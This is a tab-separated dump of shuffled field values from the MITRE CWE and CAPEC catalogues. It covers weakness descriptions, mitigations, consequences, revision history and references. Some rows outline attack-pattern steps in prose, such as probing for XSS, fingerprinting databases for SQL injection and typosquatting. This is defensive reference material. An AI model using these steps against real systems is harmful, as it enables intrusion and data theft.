18293	42	Know architecture and implementation weaknesses of the privileged APIs and make sure to account for these weaknesses before calling the privileged APIs to ensure that they can be called safely.
13458	62	updated Common_Consequences
8876	31	1000
24105	35	MITRE
11163	28	CWE Content Team
15850	104	756
15737	103	Primary
18196	39	2017-05-03
15283	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
13164	78	High
23215	33	Stefan Esser
13319	35	MITRE
24656	91	Architecture and Design
19630	56	ChildOf
10059	28	CWE Content Team
6691	90	Language-Independent
21231	62	updated Common_Consequences
22057	50	Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.
9760	35	MITRE
6671	100	The MITRE Corporation
15787	56	ChildOf
17212	63	Execute Unauthorized Code or Commands
8200	91	Implementation
19469	44	SOAR Partial
5702	35	MITRE
11350	39	2010-12-13
17968	28	CWE Content Team
21374	94	A successful Reflected XSS attack can enable an adversary to exfiltrate sensitive information from the application.
8790	45	Variant
10961	39	2019-06-20
11134	88	Multiple Inheritance from Concrete Classes
23065	73	Use a browser to manually explore the website and analyze how the application processes XML requests.
19641	35	MITRE
12288	50	Use of parameterized queries or stored procedures - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails. Note that SQL Injection is possible even in the presence of stored procedures if the eventual query is constructed dynamically.
12897	89	Detailed
9088	88	Use of Hard-coded, Security-relevant Constants
15778	31	699
9210	81	Confidentiality
5681	54	Low
8090	81	Integrity
6956	62	updated Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns
23866	61	Stable
10085	43	Simple
19331	33	Wikipedia
8581	103	Primary
19264	56	ChildOf
20994	39	2014-02-18
22671	62	updated Common_Consequences
12422	104	1022
22389	79	Authorization
17756	78	Low
13664	56	ChildOf
17428	79	Confidentiality
22399	39	2008-10-14
6120	62	updated References, Relationships
7340	31	1000
14528	91	Testing
16842	77	Automated Dynamic Analysis
23089	62	updated Common_Consequences
6399	79	Confidentiality
23110	62	updated Relationships, Taxonomy_Mappings
24839	103	Primary
23819	62	updated Applicable_Platforms, Taxonomy_Mappings, White_Box_Definitions
16846	39	2011-06-01
8448	39	2014-06-23
19840	56	CanAlsoBe
19018	27	Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.
22985	35	MITRE
16288	35	MITRE
6088	91	Implementation
21043	35	MITRE
20206	28	CWE Content Team
10981	63	Alter Execution Logic
8196	28	CWE Content Team
23862	39	2009-10-29
20051	56	PeerOf
14558	62	updated Taxonomy_Mappings
13301	55	Seamus Tuohy
8138	62	updated Relationships, Taxonomy_Mappings
23161	39	2017-11-08
20463	72	If these messages or packets are sent with unnecessary data contained within, it may tip off malicious listeners as to the process that created the message. With this information, attackers may learn any number of things, including the hardware platform, operating system, or algorithms used by the sender. This information can be of significant value to the user in launching further attacks.
8902	39	2008-07-01
20091	39	2017-11-08
21751	62	updated Time_of_Introduction
22912	28	CWE Content Team
7908	88	Predictable Seed in Pseudo-Random Number Generator (PRNG)
6635	40	The cache must be inadequately protected against attacker access.
15962	92	Exploit
5610	30	Navya Sidharth
23552	26	Architecture and Design
6523	72	The data read from the system vouched for by the expired certificate may be flawed due to malicious spoofing.
14276	31	1000
6483	53	The MITRE Corporation
9837	33	Adam Doupé
9966	61	Draft
23847	39	2009-07-27
20420	93	Limited
19878	59	Updated Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity
10295	39	2010-06-21
9612	62	updated Demonstrative_Examples
7726	60	09
11114	100	The MITRE Corporation
11798	28	CWE Content Team
25433	63	Read Application Data
15253	35	Cigital
8240	101	CAPEC Content Team
18604	39	2010-12-13
24440	23	Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.
14294	42	Passwords should be encrypted with keys that are at least 128 bits in length for adequate security.
12082	63	DoS: Crash, Exit, or Restart
14113	28	CWE Content Team
18811	97	Privilege Abuse
9555	74	2
18281	63	Gain Privileges or Assume Identity
8516	62	updated Relationships
12429	86	http://reversemode.com/index.php?option=com_content&task=view&id=38&Itemid=1
18140	62	updated Related_Attack_Patterns
14601	102	ChildOf
14295	28	CWE Content Team
11742	39	2012-10-30
7932	35	Cigital
22809	62	updated Demonstrative_Examples, Relationships
11389	79	Confidentiality
12988	35	MITRE
24044	33	Joshbw
24266	39	2011-06-01
24738	102	ChildOf
19603	39	2008-07-01
9103	88	Improper Handling of Values
14448	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
18952	101	CAPEC Content Team
22672	39	2010-02-16
22121	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12670	45	Variant
22750	28	CWE Content Team
14781	39	2008-09-08
15983	35	MITRE
15173	72	If a non-canonical URL is used, the server may choose to return the contents of the file, instead of pre-processing the file (e.g. as a program).
15153	63	Varies by Context
13253	72	Suspicious comments could be an indication that there are problems in the source code that may need to be fixed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses.
6199	34	This issue is likely to occur in restrictive environments in which the operating system or application provides fine-grained control over privilege management.
20030	62	Improved the White_Box_Definition
20125	39	2011-03-29
10151	31	1003
14805	103	Primary
18686	28	CWE Content Team
21798	39	2012-05-11
23241	35	MITRE
16113	28	CWE Content Team
9634	35	MITRE
18048	26	Implementation
24459	56	ChildOf
20164	100	The MITRE Corporation
7351	53	The MITRE Corporation
23979	35	MITRE
14518	76	2017-01-09
24773	28	CWE Content Team
14649	62	updated Potential_Mitigations
20016	55	CAPEC Content Team
9867	62	updated Potential_Mitigations, Time_of_Introduction
14272	56	ChildOf
8761	28	CWE Content Team
21079	104	135
22536	85	434
14194	28	CWE Content Team
24759	51	2014-06-23
11795	86	https://arxiv.org/abs/1801.01203
16965	62	updated Applicable_Platforms, Description, Enabling_Factors_for_Exploitation, Observed_Examples, Relationships
7036	81	Access Control
22264	62	updated Potential_Mitigations, References
10068	35	Cigital
25063	35	MITRE
18765	78	Low
20427	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
21133	45	Base
9319	39	2017-11-08
13165	28	CWE Content Team
11559	42	Follow the principle of least privilege when assigning access rights to entities in a software system.                   Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
8407	90	Interpreted
20709	66	Virtual Destructor
17732	45	Base
5815	55	CAPEC Content Team
8127	62	updated Potential_Mitigations, Time_of_Introduction
10838	28	CWE Content Team
12919	59	Updated Related_Attack_Patterns, Related_Weaknesses
16559	35	MITRE
24660	47	Other
21646	43	Simple
7692	101	CAPEC Content Team
20241	35	MITRE
21036	28	CWE Content Team
18707	43	Simple
23966	61	Draft
15965	39	2011-06-01
23502	35	MITRE
24674	28	CWE Content Team
16732	39	2008-07-01
8063	88	Storing Passwords in a Recoverable Format
21590	67	Medium
21797	39	2010-04-05
22813	103	Primary
18118	96	2008-01-18
12532	43	Simple
19062	100	The MITRE Corporation
17595	92	Exploit
15414	55	CAPEC Content Team
11916	28	CWE Content Team
19348	35	Cigital
23966	50	Configuration: If using a Web Application Firewall (WAF), filters should be carefully configured to detect abnormal HTTP requests                Design: Perform URL encoding                Implementation: Use strict regular expressions in URL rewriting                Implementation: Beware of multiple occurrences of a parameter in a Query String
19979	39	2014-07-30
15974	26	Implementation
16912	62	updated Potential_Mitigations
15606	35	MITRE
14212	102	ChildOf
8432	104	791
15859	49	2010
12377	62	updated Common_Consequences, Demonstrative_Examples, References, Relationships
17357	103	Primary
16379	50	Review the functions exposed by the WSDL interface (especially if you have used a tool to generate it). Make sure that none of them is vulnerable to injection.
13541	59	Updated Related_Attack_Patterns
18251	35	MITRE
13369	100	The MITRE Corporation
22007	49	2004
23761	62	updated Potential_Mitigations
10031	103	Primary
7507	102	ChildOf
24856	47	Read Data
18592	76	2019-04-04
11179	74	4
22069	81	Integrity
7023	88	Incorrect Check of Function Return Value
21471	104	65
12813	35	MITRE
24942	21	7 Pernicious Kingdoms
14489	77	Automated Static Analysis - Source Code
19703	81	Other
14761	39	2011-06-01
6751	35	MITRE
23359	39	2019-01-03
24438	47	Read Data
14178	35	MITRE
19801	39	2014-07-30
13965	56	ChildOf
18570	62	updated Potential_Mitigations
12963	58	The debug attribute of the <compilation> tag defines whether compiled binaries should include debugging information. The use of debug binaries causes an application to provide as much information about itself as possible to the user.
23027	69	Incomplete
17227	77	Dynamic Analysis with Automated Results Interpretation
10584	43	Simple
10043	28	CWE Content Team
12765	28	CWE Content Team
13848	103	Primary
13772	100	The MITRE Corporation
17599	81	Other
5927	30	Marc Stevens
23600	28	CWE Content Team
22406	62	updated Relationships, Taxonomy_Mappings
10235	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.                   Alternately, use built-in functions, but consider using wrappers in case those functions are discovered to have a vulnerability.
20232	56	ChildOf
15344	28	CWE Content Team
9979	91	Build and Compilation
15930	88	Struts: Plug-in Framework not in Use
20002	62	updated Common_Consequences
13360	101	CAPEC Content Team
7060	55	CAPEC Content Team
19023	28	CWE Content Team
10932	56	ChildOf
16365	21	PLOVER
24495	39	2017-11-08
13459	39	2008-07-01
7654	81	Availability
12490	56	ChildOf
10135	26	Architecture and Design
7243	62	updated Common_Consequences
15021	21	Anonymous Tool Vendor (under NDA)
7259	102	ChildOf
15831	39	2008-07-01
11945	35	Veracode
17877	45	Base
6602	62	updated Demonstrative_Examples
9859	39	2009-07-27
20588	88	Deadlock
12620	21	7 Pernicious Kingdoms
12024	86	http://www.hpenterprisesecurity.com/vulncat/en/vulncat/java/android_bad_practices_sticky_broadcast.html
13234	86	http://www.redhat.com/magazine/009jul05/features/execshield/
10859	28	CWE Content Team
24079	50	When implementing security features, consider how they can be misused and compromised.
13426	67	High
22469	45	Base
22839	28	CWE Content Team
8485	28	CWE Content Team
14406	31	699
13754	46	If the iteration can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory. In many cases, a loop does not need to be infinite in order to cause enough resource consumption to adversely affect the software or its host system; it depends on the amount of resources consumed per iteration.
14770	28	CWE Content Team
20473	39	2008-10-14
24948	100	The MITRE Corporation
7154	39	2014-07-30
8499	39	2014-07-30
22182	76	2018-07-31
6163	42	Use a language or a library that provides a cryptography framework at a higher level of abstraction.
6205	53	The MITRE Corporation
10906	39	2012-05-11
16357	103	Primary
22057	40	The attacker must be able to control the path that is requested of the target.
19320	45	Base
13161	63	Modify Files or Directories
12544	39	2009-07-27
10634	35	MITRE
16619	89	Detailed
17600	79	Availability
16981	95	Attacker identifies command utilities exposed by the target host.
18326	66	Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest
9336	28	CWE Content Team
20661	73	Register the TypoSquatted domain.
19026	28	CWE Content Team
21569	38	Many incorrect login attempts are detected by the system.
19558	59	Updated Attack_Phases
14566	43	Simple
19047	90	Language-Independent
25086	91	Architecture and Design
24648	21	Landwehr
14962	51	2014-06-23
17190	79	Confidentiality
18430	28	CWE Content Team
9665	76	2015-11-09
5921	81	Integrity
21978	35	MITRE
13096	43	Simple
24164	62	updated Demonstrative_Examples, Observed_Examples, References, Relationships
17648	35	MITRE
25360	53	The MITRE Corporation
21259	45	Variant
17158	51	2014-06-23
15682	100	The MITRE Corporation
6884	46	Case (2) is possible in the PHP preg_replace() function, and possibly in other languages when a user-controlled input is inserted into a string that is later parsed as a regular expression.
20429	43	Simple
14501	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
24457	57	Primary
5897	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.                   Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.
11794	35	MITRE
7749	45	Variant
16456	26	Implementation
21384	24	Cigital
9872	35	MITRE
19655	21	PLOVER
14366	35	MITRE
6738	80	It may be trivial to cause a DoS via this attack pattern
6378	39	2017-11-08
8176	25	Low
21290	47	Hide Activities
10770	62	updated Relationships, Taxonomy_Mappings
13464	21	PLOVER
21145	79	Authorization
20117	81	Access Control
5932	28	CWE Content Team
23470	69	Incomplete
9696	62	updated Relationships, Taxonomy_Mappings
16793	35	MITRE
13983	103	Primary
8534	62	updated Description, Maintenance_Notes
22142	50	Frequent changing of mobile number.
16267	101	CAPEC Content Team
7782	39	2017-11-08
18756	46	A directory listing provides an attacker with the complete index of all the resources located inside of the directory. The specific risks and consequences vary depending on which files are listed and accessible.
24040	28	CWE Content Team
6785	104	832
25004	104	22
13651	62	updated Demonstrative_Examples
11177	101	CAPEC Content Team
10192	62	updated Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Observed_Examples
7442	28	CWE Content Team
16363	35	MITRE
6172	42	Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.                   Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64].
15792	39	2008-07-01
23930	35	MITRE
6324	39	2012-05-11
14056	89	Detailed
15146	74	3
18577	79	Authorization
23441	94	Run Arbitrary Code
17234	35	MITRE
11326	57	Indirect
6627	76	2019-09-30
7944	76	2015-12-07
25284	31	1000
14445	40	The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.
22851	88	Unintended Proxy or Intermediary ('Confused Deputy')
21444	39	2008-09-08
8969	101	CAPEC Content Team
10801	23	The source code uses literal constants that may need to change      or evolve over time, instead of using symbolic constants.
17837	28	CWE Content Team
17703	39	2008-09-08
10239	44	SOAR Partial
14755	81	Confidentiality
15155	69	Stable
9726	91	Operation
22915	62	updated Relationships
8295	26	Architecture and Design
21262	63	Read Application Data
20967	63	Read Application Data
23907	35	MITRE
8663	63	Gain Privileges or Assume Identity
16884	35	MITRE
16696	35	MITRE
21025	39	2012-05-11
10759	86	http://msdn.microsoft.com/en-us/library/bb288454.aspx
9909	46	When free() is called on an invalid pointer, the program's memory management data structures may become corrupted. This corruption can cause the program to crash or, in some circumstances, an attacker may be able to cause free() to operate on controllable memory locations to modify critical program variables or execute code.
8115	61	Stable
16009	39	2008-10-14
12525	91	Architecture and Design
13217	28	CWE Content Team
23208	77	Automated Static Analysis
18710	35	Cigital
23907	62	updated Relationships, Other_Notes
13961	39	2012-10-30
19899	81	Confidentiality
20686	62	updated References
12554	62	updated Relationships, Taxonomy_Mappings
12375	77	Manual Dynamic Analysis
23845	80	To modify the entries in the configuration file pointing to malicious libraries
7861	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The "../" manipulation is the canonical manipulation for operating systems that use "/" as directory separators, such as UNIX- and Linux-based systems. In some cases, it is useful for bypassing protection schemes in environments for which "/" is supported but not the primary separator, such as Windows, which uses "\" but can also accept "/".
12959	95	[Identify and characterize metacharacter-processing vulnerabilities in email headers] An attacker creates emails with headers containing various metacharacter-based malicious payloads in order to determine whether the target application processes the malicious content and in what manner it does so.
7549	103	Primary
17610	101	CAPEC Content Team
23938	57	Resultant
9136	28	CWE Content Team
11893	35	MITRE
17450	39	2008-07-01
25369	46	Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.             When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.
22529	46	Because arrays are mutable objects, the final constraint requires that the array object itself be assigned only once, but makes no guarantees about the values of the array elements. Since the array is public, a malicious program can change the values stored in the array. As such, in most cases an array declared public, final and static is a bug.
19072	100	The MITRE Corporation
10729	62	updated Potential_Mitigations, Time_of_Introduction
20267	62	updated Relationships
17751	39	2012-10-30
11686	35	MITRE
25188	39	2008-09-08
23372	42	Developers should anticipate that leading characters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
13447	23	An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.
24755	28	CWE Content Team
12965	62	updated Time_of_Introduction
7929	39	2014-07-30
17090	56	ChildOf
14734	31	1003
24770	39	2009-01-12
21833	28	CWE Content Team
21833	39	2010-02-16
25297	39	2008-07-01
20069	86	http://projects.webappsec.org/OS-Commanding
10241	28	CWE Content Team
22553	89	Standard
16551	28	CWE Content Team
9761	77	Manual Static Analysis - Binary or Bytecode
24386	62	updated Relationships, Other_Notes, Taxonomy_Mappings
19876	104	1123
23482	28	CWE Content Team
16151	23	An adversary searches for and invokes APIs that the target system designers did not intend to be publicly available. If these APIs fail to authenticate requests the attacker may be able to invoke functionality they are not authorized for.
9907	35	MITRE
10802	79	Accountability
16234	72	Non-serializability of objects can lead to system crash.
6517	35	MITRE
22036	71	2010
15755	101	CAPEC Content Team
21638	39	2010-12-13
9134	28	CWE Content Team
13017	62	updated Common_Consequences
5747	39	2010-02-16
20096	40	The service provider does not properly utilize parameter binding when building SQL queries
9664	35	MITRE
9337	96	2018-07-02
17452	31	1000
20844	90	C++
8786	63	Gain Privileges or Assume Identity
24905	42	Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.
9520	39	2010-04-05
8933	62	updated Demonstrative_Examples, Potential_Mitigations, References
6428	79	Accountability
16401	43	Simple
25108	88	EJB Bad Practices: Use of Sockets
23226	56	ChildOf
14199	89	Standard
12972	45	Base
14301	35	MITRE
12515	62	updated Relationships
9946	56	ChildOf
14271	35	Cigital
18747	39	2012-10-30
12045	92	Explore
13059	28	CWE Content Team
24863	102	ChildOf
25358	35	MITRE
11403	28	CWE Content Team
17392	35	MITRE
23188	35	MITRE
20970	42	Use a tool that dynamically detects memory management problems, such as valgrind.
21157	26	Implementation
22776	56	ChildOf
23395	79	Integrity
13980	39	2014-07-30
5625	62	updated Common_Consequences, Relationships
15987	62	updated Demonstrative_Examples
6450	28	CWE Content Team
19170	100	The MITRE Corporation
7770	89	Standard
15795	39	2009-07-27
17176	54	Low
12612	85	626
10756	91	Implementation
24852	35	MITRE
21095	39	2008-09-08
22060	63	Other
23659	39	2017-11-08
25173	62	updated Time_of_Introduction
19616	55	CAPEC Content Team
10882	62	updated Background_Details, Common_Consequences, Functional_Areas, Relationships, Taxonomy_Mappings
19705	62	updated Relationships, Taxonomy_Mappings
19470	45	Base
24865	101	CAPEC Content Team
21915	35	MITRE
16371	42	When releasing a complex object or structure, ensure that you properly dispose of all of its member components, not just the object itself.
14298	35	MITRE
16771	45	Variant
14169	28	CWE Content Team
5906	62	updated Relationships
12274	31	1003
5703	50	Identify unnecessary system utilities or potentially malicious software that may contain functionality to identify network share information, and audit and/or block them by using whitelisting tools.
8449	35	MITRE
23589	56	ChildOf
24827	39	2019-06-20
16328	39	2011-06-01
21313	39	2008-08-15
16020	39	2019-01-03
8580	35	MITRE
9837	33	Bryce Boe
14044	26	Implementation
14052	23	The software does not record, or improperly records, security-relevant information that leads to an incorrect decision or hampers later analysis.
18814	35	MITRE
13369	76	2017-08-04
22066	62	updated Description, Name
13342	39	2008-09-08
6954	70	Generic cross-browser cross-domain theft
11721	23	A software system that accepts path input in the form of trailing space ('filedir ') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
14907	91	Installation
12667	28	CWE Content Team
18328	62	updated Relationships
8742	103	Primary
18825	35	MITRE
9670	89	Detailed
18170	35	MITRE
20341	35	MITRE
13856	51	2014-06-23
10127	28	CWE Content Team
6930	62	updated Common_Consequences
9227	104	219
22924	28	CWE Content Team
14576	62	updated Taxonomy_Mappings
17909	53	The MITRE Corporation
21348	103	Primary
10789	60	16
12869	57	Primary
16835	77	Dynamic Analysis with Automated Results Interpretation
10910	28	CWE Content Team
9019	56	ChildOf
17411	66	On Race Vulnerabilities in Web Applications
15199	95	[Probe identified potential entry points for XSS vulnerability]The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. He records all the responses from the server that include unmodified versions of his script.                   The attacker tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response.
22811	35	MITRE
5958	28	CWE Content Team
25228	94	Preventing DNS from resolving a request denies the availability of a target site or service for the user.
6564	91	Implementation
8739	40	The victim and the attacker are both in an environment where an active man in the middle attack is possible (e.g., public WIFI hot spot)The victim visits at least one website that does not use TLS / SSL
18553	97	Reverse Engineering
8175	103	Primary
13266	39	2014-07-30
24259	35	MITRE
17739	23	An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.
11959	62	updated Common_Consequences
18956	28	CWE Content Team
23292	63	Reduce Performance
21925	69	Draft
15648	35	MITRE
8502	35	MITRE
6616	62	updated Potential_Mitigations
15731	35	MITRE
21645	31	1000
7500	28	CWE Content Team
7378	28	Eric Dalci
7674	28	CWE Content Team
23988	39	2008-07-01
19901	25	Low
15904	44	High
21171	39	2019-06-20
11453	81	Integrity
10774	35	MITRE
14433	103	Primary
8947	42	Subject the software to extensive testing to discover some of the possible instances of where/how errors or return values are not handled. Consider testing techniques such as ad hoc, equivalence partitioning, robustness and fault tolerance, mutation, and fuzzing.
23693	34	There are several ways in which improper string length checking may result in an exploitable condition. All of these, however, involve the introduction of buffer overflow conditions in order to reach an exploitable state.                   The first of these issues takes place when the output of a wide or multi-byte character string, string-length function is used as a size for the allocation of memory. While this will result in an output of the number of characters in the string, note that the characters are most likely not a single byte, as they are with standard character strings. So, using the size returned as the size sent to new or malloc and copying the string to this newly allocated memory will result in a buffer overflow.                   Another common way these strings are misused involves the mixing of standard string and wide or multi-byte string functions on a single string. Invariably, this mismatched information will result in the creation of a possibly exploitable buffer overflow condition.
12074	76	2017-05-01
19950	49	2012
6444	35	MITRE
15447	61	Draft
19657	26	Implementation
25054	69	Draft
17360	56	ChildOf
16728	31	699
17656	62	updated Applicable_Platforms, Taxonomy_Mappings
18401	39	2008-08-01
8329	46	Exposure of these access control list files may give the attacker information about the configuration of the site or system. This information may then be used to bypass the intended security policy or identify trusted systems from which an attack can be launched.
7383	62	updated Time_of_Introduction
17611	76	2019-09-30
12899	35	MITRE
12269	59	Updated Related_Attack_Patterns
6890	26	Implementation
6570	21	PLOVER
21937	26	Architecture and Design
16600	55	CAPEC Content Team
14522	35	MITRE
7753	26	Implementation
9129	28	CWE Content Team
12094	62	updated Description, Potential_Mitigations, Relationships, Taxonomy_Mappings
24076	96	2009-03-03
21321	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24118	39	2011-06-27
17119	62	updated Relationships
17299	62	updated Relationships, Other_Notes, Taxonomy_Mappings
8713	101	CAPEC Content Team
11270	91	Architecture and Design
19777	42	Implement SQL strings using prepared statements that bind variables. Prepared statements that do not bind variables can be vulnerable to attack.
5923	42	Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.
11182	78	High
7907	31	699
14599	86	http://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing
20368	39	2014-07-30
7436	61	Stable
16203	39	2011-06-01
9557	100	The MITRE Corporation
23945	76	2018-07-31
10872	62	updated Relationships, Taxonomy_Mappings
14243	103	Primary
20452	35	MITRE
12450	102	ChildOf
23370	39	2012-05-11
16639	102	ChildOf
12968	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
13806	28	CWE Content Team
25194	63	Modify Memory
8801	100	The MITRE Corporation
21887	62	updated Observed_Examples
8762	51	2014-06-23
19786	47	Resource Consumption
10323	63	Unexpected State
23094	62	updated Description
7493	62	added/updated white box definitions
10891	69	Draft
5981	73	Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.
10974	46	A Web application must define a default error page for 4xx errors (e.g. 404), 5xx (e.g. 500) errors and catch java.lang.Throwable exceptions to prevent attackers from mining information from the application container's built-in error response.             When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks.
7305	28	CWE Content Team
17836	39	2019-01-03
13556	28	CWE Content Team
11897	50	Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.
21293	35	MITRE
6975	30	Brad Arkin
15774	40	The targeted application must perform the desired activities on a file without checking whether the file is a symbolic link or not. The attacker must be able to predict the name of the file the target application is modifying and be able to create a new symbolic link where that file would appear.
21000	91	Implementation
15859	66	Top 25 Series - Rank 3 - Classic Buffer Overflow
16229	72	The optimizations alter the order of execution resulting in side effects that were not intended by the original developer.
20012	73	Use a proxy tool to record results of manual input of relative path traversal probes in known URLs.
19137	42	If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.
18900	27	None: No specialized resources are required to execute this type of attack.
14214	61	Draft
8174	39	2010-06-21
10242	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10479	28	CWE Content Team
20068	62	updated Common_Consequences
8266	81	Access Control
20357	35	MITRE
14387	90	Assembly
16658	39	2011-06-27
19978	43	Simple
7845	43	Simple
13236	62	updated Description, Potential_Mitigations
8646	81	Integrity
10915	28	Eric Dalci
24602	23	The software operates in an environment in which power is a limited resource that cannot be automatically replenished, but the software does not properly restrict the amount of power that its operation consumes.
10163	62	updated References
16643	39	2008-10-10
6441	56	ChildOf
9414	32	The Open Web Application Security Project (OWASP)
8394	39	2008-11-24
20887	43	Simple
13171	43	Simple
21295	26	Implementation
16547	59	Updated Related_Attack_Patterns
7158	35	Cigital
18388	53	The MITRE Corporation
21658	62	updated Description
20819	25	High
16210	28	CWE Content Team
5633	28	CWE Content Team
20856	28	CWE Content Team
22554	31	699
7761	69	Draft
15763	79	Authorization
14413	76	2017-08-04
9307	55	CAPEC Content Team
22852	28	CWE Content Team
22057	50	Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.
12233	54	Medium
11920	79	Availability
19811	81	Confidentiality
8119	100	The MITRE Corporation
22282	39	2014-07-30
15190	62	updated Relationships, Taxonomy_Mappings
25179	21	PLOVER
6872	88	Channel Accessible by Non-Endpoint ('Man-in-the-Middle')
20446	28	CWE Content Team
7553	28	CWE Content Team
18368	74	3
9559	84	09
10701	43	Simple
18932	35	MITRE
11135	95	[Identify Backend Database Version] Determining the database engine type can assist attackers' attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.
8457	104	14
13947	63	Varies by Context
6518	21	7 Pernicious Kingdoms
23195	28	CWE Content Team
10406	79	Authorization
13771	44	High
6787	28	CWE Content Team
16272	62	updated Demonstrative_Examples, Relationships
15490	50	Implementation: Appropriately deal with error messages.
24179	35	MITRE
20319	28	CWE Content Team
19123	50	Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.
13740	80	To identify and execute against an over-privileged system interface
13957	28	CWE Content Team
13886	39	2014-02-18
8397	97	Kerberoasting
21535	31	1000
22515	39	2017-05-03
24336	62	updated Name
19679	35	MITRE
7557	69	Incomplete
22760	35	MITRE
8938	51	2014-06-23
15861	39	2013-07-17
16702	28	Eric Dalci
8663	72	An attacker may be able to access resources with the elevated privilege that could not be accessed with the attacker's original privileges. This is particularly likely in conjunction with another flaw, such as a buffer overflow.
22690	62	updated Common_Consequences, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
24847	28	CWE Content Team
8482	69	Incomplete
13783	95	[Disable or remove the critical functionality from the client code] Once the functionality has been determined, the attacker disables or removes the critical functionality from the client code to perform malicious actions that the server believes are prohibited.
22258	62	updated Relationships
5858	103	Primary
12193	62	updated Relationships, Other_Notes, Taxonomy_Mappings
24597	76	2017-01-09
